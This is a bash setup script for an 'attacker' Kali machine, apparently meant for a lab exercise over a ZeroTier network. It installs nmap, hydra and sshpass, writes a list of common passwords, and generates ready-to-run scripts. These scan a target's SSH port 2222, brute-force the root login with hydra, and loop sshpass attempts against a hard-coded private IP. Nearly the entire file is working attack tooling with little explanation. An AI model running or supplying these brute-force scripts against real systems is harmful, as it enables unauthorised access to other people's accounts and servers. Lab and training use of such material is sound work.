#!/bin/bash
# Attacker VM Setup Script (Kali Linux)
# Run this on the attacking machine

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

clear
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  ATTACKER VM SETUP (Kali Linux)${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""

# Check if running as root for some commands
if [ "$EUID" -ne 0 ]; then 
    echo -e "${YELLOW}Note: Some commands may require sudo${NC}"
fi

# Step 1: Install required tools
echo -e "${BLUE}[1/5] Checking attack tools...${NC}"

TOOLS_NEEDED=0

if ! command -v nmap &> /dev/null; then
    echo "  Installing nmap..."
    sudo apt-get update -qq
    sudo apt-get install -y nmap
    TOOLS_NEEDED=1
fi

if ! command -v hydra &> /dev/null; then
    echo "  Installing hydra..."
    sudo apt-get install -y hydra
    TOOLS_NEEDED=1
fi

if ! command -v sshpass &> /dev/null; then
    echo "  Installing sshpass..."
    sudo apt-get install -y sshpass
    TOOLS_NEEDED=1
fi

if [ $TOOLS_NEEDED -eq 0 ]; then
    echo -e "${GREEN}✓ All tools already installed${NC}"
else
    echo -e "${GREEN}✓ Tools installed${NC}"
fi
echo ""

# Step 2: Check ZeroTier
echo -e "${BLUE}[2/5] Checking ZeroTier connection...${NC}"
ZT_IP=$(ip addr show | grep "inet.*zt" | awk '{print $2}' | cut -d/ -f1 | head -1)

if [ -n "$ZT_IP" ]; then
    echo -e "${GREEN}✓ ZeroTier connected${NC}"
    echo "  Your IP: $ZT_IP"
else
    echo -e "${YELLOW}⚠ ZeroTier not detected${NC}"
    echo "  Make sure you've joined the network"
fi
echo ""

# Step 3: Create attack directory
echo -e "${BLUE}[3/5] Creating attack workspace...${NC}"
mkdir -p ~/attacker-workspace
cd ~/attacker-workspace

# Create password list
cat > passwords.txt << 'PASS'
admin
password
123456
root
admin123
qwerty
letmein
welcome
password123
12345678
toor
test
1234
changeme
PASS

echo -e "${GREEN}✓ Workspace created at ~/attacker-workspace${NC}"
echo ""

# Step 4: Create attack scripts
echo -e "${BLUE}[4/5] Creating attack scripts...${NC}"

# Nmap scan script
cat > scan.sh << 'SCAN'
#!/bin/bash
TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./scan.sh <target_ip>"
    exit 1
fi

echo "=== Scanning $TARGET ==="
echo ""
echo "[1/2] Port scan..."
nmap -p 2222 $TARGET

echo ""
echo "[2/2] Service detection..."
nmap -sV -p 2222 $TARGET
SCAN

# Hydra attack script
cat > attack.sh << 'ATTACK'
#!/bin/bash
TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./attack.sh <target_ip>"
    exit 1
fi

echo "=== Attacking $TARGET ==="
echo ""
echo "Starting Hydra brute-force..."
echo "Target: $TARGET:2222"
echo "User: root"
echo "Wordlist: passwords.txt"
echo ""

hydra -l root -P passwords.txt ssh://$TARGET:2222 -t 4 -V

echo ""
echo "Attack complete!"
ATTACK

# Manual test script
cat > manual_test.sh << 'MANUAL'
#!/bin/bash
TARGET=${1:-192.168.192.41}

echo "=== Manual SSH Testing ==="
echo "Target: $TARGET:2222"
echo ""

for pass in admin password 123456 root; do
    echo "Trying password: $pass"
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@$TARGET -p 2222 "echo 'Success'" 2>/dev/null || echo "Failed"
    sleep 1
done
MANUAL

chmod +x scan.sh attack.sh manual_test.sh

echo -e "${GREEN}✓ Attack scripts created${NC}"
echo ""

# Step 5: Instructions
echo -e "${BLUE}[5/5] Setup complete!${NC}"
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  READY TO ATTACK${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "${YELLOW}Get target IP from victim first!${NC}"
echo ""
echo -e "${BLUE}Attack Commands:${NC}"
echo ""
echo "1. Scan target:"
echo -e "   ${GREEN}./scan.sh 192.168.192.41${NC}"
echo ""
echo "2. Run brute-force:"
echo -e "   ${GREEN}./attack.sh 192.168.192.41${NC}"
echo ""
echo "3. Manual testing:"
echo -e "   ${GREEN}./manual_test.sh 192.168.192.41${NC}"
echo ""
echo "4. Direct SSH:"
echo -e "   ${GREEN}ssh root@192.168.192.41 -p 2222${NC}"
echo ""
echo -e "${BLUE}Files created:${NC}"
echo "  ~/attacker-workspace/scan.sh"
echo "  ~/attacker-workspace/attack.sh"
echo "  ~/attacker-workspace/manual_test.sh"
echo "  ~/attacker-workspace/passwords.txt"
echo ""
echo -e "${YELLOW}Your current location:${NC} $(pwd)"
echo ""
